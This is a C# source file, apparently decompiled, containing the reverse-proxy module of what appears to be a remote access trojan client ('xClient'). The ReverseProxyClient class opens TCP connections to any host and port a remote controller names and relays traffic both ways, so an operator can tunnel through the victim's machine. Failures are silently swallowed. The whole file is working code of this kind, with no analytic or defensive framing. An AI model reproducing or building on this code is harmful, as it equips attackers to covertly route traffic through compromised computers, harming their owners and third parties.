using System;
using System.Net;
using System.Net.Sockets;
using xClient.Core.Networking;
using xClient.Core.ReverseProxy.Packets;

namespace xClient.Core.ReverseProxy;

public class ReverseProxyClient
{
	public const int BUFFER_SIZE = 8192;

	private byte[] _buffer;

	private bool _disconnectIsSend;

	public int ConnectionId { get; private set; }

	public Socket Handle { get; private set; }

	public string Target { get; private set; }

	public int Port { get; private set; }

	public Client Client { get; private set; }

	public ReverseProxyClient(ReverseProxyConnect command, Client client)
	{
		ConnectionId = command.ConnectionId;
		Target = command.Target;
		Port = command.Port;
		Client = client;
		Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
		Handle.BeginConnect(command.Target, command.Port, Handle_Connect, null);
	}

	private void Handle_Connect(IAsyncResult ar)
	{
		try
		{
			Handle.EndConnect(ar);
		}
		catch
		{
		}
		if (Handle.Connected)
		{
			try
			{
				_buffer = new byte[8192];
				Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
			}
			catch
			{
				new ReverseProxyConnectResponse(ConnectionId, isConnected: false, null, 0, Target).Execute(Client);
				Disconnect();
			}
			IPEndPoint iPEndPoint = (IPEndPoint)Handle.LocalEndPoint;
			new ReverseProxyConnectResponse(ConnectionId, isConnected: true, iPEndPoint.Address, iPEndPoint.Port, Target).Execute(Client);
		}
		else
		{
			new ReverseProxyConnectResponse(ConnectionId, isConnected: false, null, 0, Target).Execute(Client);
		}
	}

	private void AsyncReceive(IAsyncResult ar)
	{
		try
		{
			int num = Handle.EndReceive(ar);
			if (num <= 0)
			{
				Disconnect();
				return;
			}
			byte[] array = new byte[num];
			Array.Copy(_buffer, array, num);
			new ReverseProxyData(ConnectionId, array).Execute(Client);
		}
		catch
		{
			Disconnect();
			return;
		}
		try
		{
			Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
		}
		catch
		{
			Disconnect();
		}
	}

	public void Disconnect()
	{
		if (!_disconnectIsSend)
		{
			_disconnectIsSend = true;
			new ReverseProxyDisconnect(ConnectionId).Execute(Client);
		}
		try
		{
			Handle.Close();
		}
		catch
		{
		}
		Client.RemoveProxyClient(ConnectionId);
	}

	public void SendToTargetServer(byte[] data)
	{
		try
		{
			Handle.Send(data);
		}
		catch
		{
			Disconnect();
		}
	}
}
